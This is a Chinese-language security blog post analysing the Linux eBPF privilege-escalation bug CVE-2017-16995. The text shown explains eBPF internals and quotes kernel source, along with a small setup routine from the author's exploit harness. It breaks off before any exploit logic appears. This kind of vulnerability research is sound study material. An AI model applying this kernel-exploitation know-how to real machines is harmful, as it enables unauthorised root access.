<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="P4nda" />



<meta name="description" content="丢在todo list里大半年都没想起来碰，恰好之前复现了一个bpf模块的漏洞，顺便把ebpf模块代码熟悉一下，复现了这个漏洞，作为调试的第二个漏洞。">
<meta name="keywords" content="KERNEL,PWN,VULNERABILITY">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）">
<meta property="og:url" content="http://p4nda.top/2019/01/18/CVE-2017-16995/index.html">
<meta property="og:site_name" content="p4nda&#39;s blog">
<meta property="og:description" content="丢在todo list里大半年都没想起来碰，恰好之前复现了一个bpf模块的漏洞，顺便把ebpf模块代码熟悉一下，复现了这个漏洞，作为调试的第二个漏洞。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-01-19T04:38:24.242Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）">
<meta name="twitter:description" content="丢在todo list里大半年都没想起来碰，恰好之前复现了一个bpf模块的漏洞，顺便把ebpf模块代码熟悉一下，复现了这个漏洞，作为调试的第二个漏洞。">
<link rel="stylesheet" href="/live2d/css/live2d.css" />
<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="p4nda&#39;s blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/p4nda.jpeg">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995） | p4nda&#39;s blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?11859a78d84a58f3a5bac3d2ec5ea89e";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/p4nda.jpeg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">P4nda</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:root@p4nda.xyz" title="Email"></a>
                            
                                <a class="fa 新浪微博" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
                            
                                <a class="fa GitHub" href="https://github.com/ret2p4nda" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa 知乎" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
                            
                                <a class="fa 博客园" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
                            
                                <a class="fa QQ" href="tencent://message/?uin=381124487&Site=junichi&Menu=yes" title="QQ"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNABLE-TW/">PWNABLE.TW</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Questions/">Questions</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VULNERABILITY/">VULNERABILITY</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="http://0gur1.cc">0gur1</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://tacxingxing.com">Tac1t0rnX</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://veritas501.space/">Veritas501</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://p1umer.club/">p1umer</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://blog.aisissel.cn/">Sissel</a>
                    
                      <a class="main-nav-link switch-friends-link" href="//p4nda.top/WooyunDrops/">Wooyun知识库</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">PWNer of Dubhe | PWN &amp; security | byr</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">P4nda</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/p4nda.jpeg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">P4nda</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:root@p4nda.xyz" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/ret2p4nda" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
                            
                                <a class="fa 博客园" target="_blank" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
                            
                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=381124487&Site=junichi&Menu=yes" title="QQ"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-CVE-2017-16995" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/01/18/CVE-2017-16995/" class="article-date">
      <time datetime="2019-01-18T07:08:22.000Z" itemprop="datePublished">2019-01-18</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VULNERABILITY/">VULNERABILITY</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>这个漏洞在2017年底被Google Project Zero团队的Jann Horn发现并修复，然而在2018年4月再次被国外安全研究者Vitaly Nikolenko发现，并可以对特定内核版本的Ubuntu 16.04进行提权，这个漏洞不包含堆栈攻击或者控制流劫持，仅用系统调用数据进行提权，是Data-Oriented Attacks在linux内核上的一个典型应用。</p>
<p>本文分析基于v4.4.110，可以从<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.110.tar.gz" target="_blank" rel="noopener">这里</a>下载编译，也可以从<a href="https://elixir.bootlin.com/linux/v4.4.110/source" target="_blank" rel="noopener">这里</a>在线阅读，本文涉及到的代码、镜像等可从<a href="https://github.com/ret2p4nda/kernel-pwn/tree/master/cve-2017-16995" target="_blank" rel="noopener">这里</a>下载。</p>
<h1 id="EBPF模块分析"><a href="#EBPF模块分析" class="headerlink" title="EBPF模块分析"></a>EBPF模块分析</h1><p>之前在做pwnable.tw里的seccomp-tools一题时，曾经看过一部分bpf代码，但主要是为了逆向seccomp沙箱的规则。</p>
<p>BPF 的全称是 Berkeley Packet Filter，这是一个用于过滤(filter)网络报文(packet)的架构。Linux中常用的抓包软件tcpdump、wireshark都是基于这个模块来对用户提供抓包的接口的。在linux内核3.15以后，基于原有的BPF模块，Linux重新设计了BPF模块，并称之为extended BPF，简称EBPF。</p>
<p>EBPF主要可以为用户加载数据包过滤代码进入内核，并在收到数据包时触发这段代码。</p>
<p>一个常见的数据包过滤程序编写如下：</p>
<ol>
<li>调用 syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))申请一个map结构，这个结构是用户态与内核态交互的一块共享内存。内核态调用BPF_FUNC_map_lookup_elem来查看map中的数据。而用户态通过syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr))查看map中数据，用户可以通过syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr))对map数据进行更新，而map根据linux特性，会将其视为一个文件，并分配一个文件描述符。</li>
<li>调用syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))将用户编写的EBPF代码加载进入内核，此时将完成对代码合法性的检查，采用模拟执行的方法。</li>
<li>调用setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd))，将步骤2的EBPF代码与特定的socket进行绑定，此后对于每一个socket数据包执行EBPF代码进行检查，此时为真实执行。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);</span><br><span class="line">	<span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"mapfd finished"</span>);</span><br><span class="line">	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">			(struct bpf_insn *)__prog, PROGSIZE, <span class="string">"GPL"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"bpf_prog_load finished"</span>);</span><br><span class="line">	<span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"socketpair finished"</span>);</span><br><span class="line">	<span class="keyword">if</span>(setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"setsockopt finished"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="EBPF指令集介绍"><a href="#EBPF指令集介绍" class="headerlink" title="EBPF指令集介绍"></a>EBPF指令集介绍</h2><p>EBPF采用的指令集与内核使用的汇编指令不同，采用了一种基于bpf_insn数据结构的指令集,同时还维护了10个寄存器，一个栈，并且有与用户态交互的map结构。</p>
<p>首先是寄存器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">R0：一般用来表示函数返回值，包括整个 BPF 代码块（其实也可被看做一个函数）的返回值；</span><br><span class="line">R1~R5：一般用于表示内核预设函数的参数；</span><br><span class="line">R6~R9：在 BPF 代码中可以作存储用，其值不受内核预设函数影响；</span><br><span class="line">R10：只读，用作栈指针(SP)</span><br><span class="line">可理解对应为物理寄存器为：</span><br><span class="line">	R0 – rax</span><br><span class="line">    R1 - rdi</span><br><span class="line">    R2 - rsi</span><br><span class="line">    R3 - rdx</span><br><span class="line">    R4 - rcx</span><br><span class="line">    R5 - r8</span><br><span class="line">    R6 - rbx</span><br><span class="line">    R7 - r13</span><br><span class="line">    R8 - r14</span><br><span class="line">    R9 - r15</span><br><span class="line">    R10 – rbp</span><br></pre></td></tr></table></figure>
<p>但内核寄存器的实现同EBPF模拟的栈一样，仍然依赖于栈上的临时变量，并不是直接映射为寄存器。后续将从代码层面分析。</p>
<p>接着是指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">	__u8	code;		<span class="comment">/* opcode */</span></span><br><span class="line">	__u8	dst_reg:<span class="number">4</span>;	<span class="comment">/* dest register */</span></span><br><span class="line">	__u8	src_reg:<span class="number">4</span>;	<span class="comment">/* source register */</span></span><br><span class="line">	__s16	off;		<span class="comment">/* signed offset */</span></span><br><span class="line">	__s32	imm;		<span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>熟悉seccomp-tools的同学可能发现，这个结构和seccomp的基本差不多。程序的功能主要取决于code这个字节，代表功能，其中code操作码共有8个比特，其中最低3个比特代表大类功能，从如下代码中看出EBPF共分7类功能，<a href="https://elixir.bootlin.com/linux/v4.4.110/source/include/uapi/linux/bpf_common.h#L6" target="_blank" rel="noopener">定义</a>如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_CLASS，</span></span><br><span class="line">(code) ((code) &amp; <span class="number">0x07</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_LD		0x00 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_LDX		0x01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_ST		0x02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_STX		0x03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_ALU		0x04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_JMP		0x05</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_RET		0x06</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_MISC    0x07</span></span><br></pre></td></tr></table></figure>
<p>而对于各大类功能还可以从通过异或组成不同的新功能。具体的操作可以参考<a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/core.c#L195" target="_blank" rel="noopener">实现中的定义名</a>，根据操作名就可以看出来每一种功能的大意了，我写了一个解码编码的小工具放在github连接中，可以用来翻译或者辅助编写EBPF程序。</p>
<p>dst_reg代表目的寄存器，限制为0~10，src_reg代表目的寄存器，限制为0~10，off代表地址偏移，imm代表立即数。 </p>
<p>下面将从代码层面分析EBPF的运行流程。</p>
<h2 id="BPF-MAP-CREATE"><a href="#BPF-MAP-CREATE" class="headerlink" title="BPF_MAP_CREATE"></a>BPF_MAP_CREATE</h2><p>这个系统调用首先调用map_create函数，这个函数就是之前分析的bpf模块整数溢出漏洞所在的函数，具体内容可以参照<a href="http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E">上一篇博客</a>，其核心思想是对申请出一块内存空间，其大小是管理块结构体+attr参数中的size大小，为其分配fd，并将其放入到map队列中，可以用fd号来查找。此部分与本漏洞相关性不大。</p>
<p><a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/syscall.c#L136" target="_blank" rel="noopener">map_create</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* called via syscall */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_create</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = CHECK_ATTR(BPF_MAP_CREATE);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span></span><br><span class="line">	<span class="built_in">map</span> = find_and_alloc_map(attr);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">	atomic_set(&amp;<span class="built_in">map</span>-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">	atomic_set(&amp;<span class="built_in">map</span>-&gt;usercnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	err = bpf_map_charge_memlock(<span class="built_in">map</span>);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> free_map;</span><br><span class="line"></span><br><span class="line">	err = bpf_map_new_fd(<span class="built_in">map</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="comment">/* failed to allocate fd */</span></span><br><span class="line">		<span class="keyword">goto</span> free_map;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">free_map:</span><br><span class="line">	<span class="built_in">map</span>-&gt;ops-&gt;map_free(<span class="built_in">map</span>);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="BPF-PROG-LOAD"><a href="#BPF-PROG-LOAD" class="headerlink" title="BPF_PROG_LOAD"></a>BPF_PROG_LOAD</h2><p>这个系统调用用于将用户编写的EBPF规则加载进入内核，其中包含有多处校验。</p>
<h3 id="bpf-prog-load"><a href="#bpf-prog-load" class="headerlink" title="bpf_prog_load"></a>bpf_prog_load</h3><p>首先进入<a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/syscall.c#L621" target="_blank" rel="noopener">bpf_prog_load</a>函数中，首先[1]检查的ebpf license是否为GPL证书的一种，[2]检查指令条数是否超过4096，[3]处利用kmalloc新建了一个bpf_prog结构体，并新建了一个用于存放EBPF程序的内存空间。[4]处将用户态的EBPF程序拷贝到刚申请的内存中。[5]处来判断是哪种过滤模式，其中socket_filter是数据包过滤，而tracing_filter就是对系统调用号及参数的过滤，也就是我们常见的seccomp。最终到达[5]处开始对用户输入的程序进行检查。如果通过检查就将fp中执行函数赋值为 __bpf_prog_run也就是真实执行函数，并尝试JIT加载，否则用中断的方法加载。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">enum</span> bpf_prog_type type = attr-&gt;prog_type;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">char</span> license[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">bool</span> is_gpl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (CHECK_ATTR(BPF_PROG_LOAD))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* copy eBPF program license from user space */</span></span><br><span class="line">	<span class="keyword">if</span> (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),</span><br><span class="line">			      <span class="keyword">sizeof</span>(license) - <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	license[<span class="keyword">sizeof</span>(license) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* eBPF programs must be GPL compatible to use GPL-ed functions */</span></span><br><span class="line">[<span class="number">1</span>]	is_gpl = license_is_gpl_compatible(license);</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>]	<span class="keyword">if</span> (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS) <span class="comment">//4096</span></span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type == BPF_PROG_TYPE_KPROBE &amp;&amp;</span><br><span class="line">	    attr-&gt;kern_version != LINUX_VERSION_CODE)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* plain bpf_prog allocation */</span></span><br><span class="line">[<span class="number">3</span>]	prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);</span><br><span class="line">	<span class="keyword">if</span> (!prog)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	err = bpf_prog_charge_memlock(prog);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> free_prog_nouncharge;</span><br><span class="line"></span><br><span class="line">	prog-&gt;len = attr-&gt;insn_cnt;</span><br><span class="line"></span><br><span class="line">	err = -EFAULT;</span><br><span class="line">[<span class="number">4</span>]	<span class="keyword">if</span> (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns),</span><br><span class="line">			   prog-&gt;len * <span class="keyword">sizeof</span>(struct bpf_insn)) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">	prog-&gt;orig_prog = <span class="literal">NULL</span>;</span><br><span class="line">	prog-&gt;jited = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	atomic_set(&amp;prog-&gt;aux-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">	